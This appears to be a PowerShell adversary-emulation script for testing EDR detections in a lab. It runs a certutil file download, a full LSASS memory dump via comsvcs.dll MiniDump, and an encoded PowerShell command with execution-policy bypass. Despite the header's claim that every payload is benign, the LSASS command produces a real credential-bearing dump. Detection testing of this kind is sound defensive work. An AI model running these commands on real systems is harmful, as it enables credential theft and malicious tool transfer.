<#
=================================================================================
  Cloud EDR & SOAR Lab — Adversary Emulation Script
  Author: Dil Mahmud Khan
  Purpose: Safely simulate realistic attack behaviors on Windows 10/11
           to trigger LimaCharlie EDR detections and test the SOAR pipeline.
  Notice: All tests use benign payloads (safe for lab testing). Run in an
          isolated lab virtual machine with Administrator privileges.
=================================================================================
#>

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  🛡️ Cloud SOC & SOAR Lab — Adversary Emulation" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Select an attack scenario to simulate:"
Write-Host " [1] Attack 1: LOLBAS Tool Transfer via certutil.exe (T1105)"
Write-Host " [2] Attack 2: Credential Access - LSASS Memory Dump Simulation (T1003.001)"
Write-Host " [3] Attack 3: Obfuscated PowerShell Execution (T1059.001)"
Write-Host " [4] Execute All Tests Sequentially"
Write-Host " [Q] Quit"
Write-Host "----------------------------------------------------------"

$choice = Read-Host "Enter your choice"

# Create a safe working folder if it doesn't exist
$labFolder = "C:\LabAttacks"
if (!(Test-Path $labFolder)) {
    New-Item -ItemType Directory -Path $labFolder -Force | Out-Null
}

function Run-CertutilLOLBAS {
    Write-Host "`n[+] Executing Attack 1: LOLBAS Ingress Tool Transfer (certutil.exe)..." -ForegroundColor Yellow
    Write-Host "    Technique: MITRE ATT&CK T1105" -ForegroundColor Gray
    
    # We download a benign test string (EICAR harmless test file) using certutil
    $targetUrl = "https://secure.eicar.org/eicar.com"
    $outputFile = "$labFolder\payload_certutil.tmp"
    
    $command = "certutil.exe -urlcache -split -f $targetUrl $outputFile"
    Write-Host "    Running command: $command" -ForegroundColor White
    
    cmd.exe /c $command
    
    Write-Host "[✓] Attack 1 completed. Check LimaCharlie EDR for certutil process creation alert." -ForegroundColor Green
}

function Run-LSASSDumpSimulation {
    Write-Host "`n[+] Executing Attack 2: LSASS Memory Dump Access Simulation..." -ForegroundColor Yellow
    Write-Host "    Technique: MITRE ATT&CK T1003.001" -ForegroundColor Gray
    
    # Locate LSASS Process ID
    $lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        $pidNum = $lsass.Id
        Write-Host "    Found LSASS Process with PID: $pidNum" -ForegroundColor White
        
        # Simulate attacker attempting to dump LSASS using native Windows comsvcs.dll
        $dumpPath = "$labFolder\lsass_simulated.dmp"
        $command = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pidNum $dumpPath full"
        Write-Host "    Running simulated dump command: $command" -ForegroundColor White
        
        cmd.exe /c $command 2>$null
        Write-Host "[✓] Attack 2 completed. LimaCharlie will detect unauthorized handle to LSASS." -ForegroundColor Green
    } else {
        Write-Host "[!] Could not locate lsass.exe. Ensure you run this script as Administrator." -ForegroundColor Red
    }
}

function Run-ObfuscatedPowerShell {
    Write-Host "`n[+] Executing Attack 3: Obfuscated PowerShell Execution..." -ForegroundColor Yellow
    Write-Host "    Technique: MITRE ATT&CK T1059.001" -ForegroundColor Gray
    
    # Harmless payload: Write a benign message encoded in Base64
    $plainScript = "Write-Host 'Adversary Emulation: Simulated Malicious Script Execution'; Start-Sleep -Seconds 2"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($plainScript)
    $encoded = [Convert]::ToBase64String($bytes)
    
    Write-Host "    Encoded Base64 Payload: $encoded" -ForegroundColor White
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
    
    cmd.exe /c $command
    Write-Host "[✓] Attack 3 completed. EDR will detect PowerShell with encoded command flags." -ForegroundColor Green
}

switch ($choice) {
    "1" { Run-CertutilLOLBAS }
    "2" { Run-LSASSDumpSimulation }
    "3" { Run-ObfuscatedPowerShell }
    "4" {
        Run-CertutilLOLBAS
        Start-Sleep -Seconds 5
        Run-LSASSDumpSimulation
        Start-Sleep -Seconds 5
        Run-ObfuscatedPowerShell
    }
    default { Write-Host "Exiting." -ForegroundColor Gray }
}
